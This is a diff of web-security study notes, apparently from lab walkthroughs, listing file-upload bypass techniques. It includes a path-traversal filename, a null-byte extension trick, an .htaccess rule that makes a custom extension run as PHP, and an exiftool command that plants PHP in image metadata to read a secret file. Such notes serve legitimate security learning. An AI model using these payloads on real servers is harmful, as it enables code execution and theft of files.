@@ -1529,10 +1529,10 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 
 >File upload vulnerabilities bypass examples:  
   
-1. Upload ```..%2fexploit.php``` and retrieve the content ```GET /files/avatars/..%2fexploit.php```  
-2. Upload two files, first ***.htaccess*** with content  ```AddType application/x-httpd-php .l33t``` allowing then the upload and execute of second file named, ```exploit.l33t```  
-3. Upload file named, ```exploit.php%00.jpg``` and get the file execution at ```/files/avatars/exploit.php```  
-4. Create polygot using valid image file, using ```exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" stickman.jpg -o polyglot.php```. Get ```/files/avatars/polyglot.php``` content and search for ```START``` to obtain sensitive data.  
+1. Upload the file name and include obfuscated path traversal ```..%2fexploit.php``` and retrieve the content ```GET /files/avatars/..%2fexploit.php```  
+2. Upload a file named, ```exploit.php%00.jpg``` with trailing null character and get the file execution at ```/files/avatars/exploit.php```  
+3. Create polygot using valid image file, using ```exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" stickman.jpg -o polyglot.php```. Get ```/files/avatars/polyglot.php``` content and search for ```START``` to obtain sensitive data.  
+4. Upload two files, first ***.htaccess*** with content ```AddType application/x-httpd-php .l33t``` allowing then the upload and execute of second file named, ```exploit.l33t```  
   
 ![File upload stages](images/file-upload-stages.png)  
 
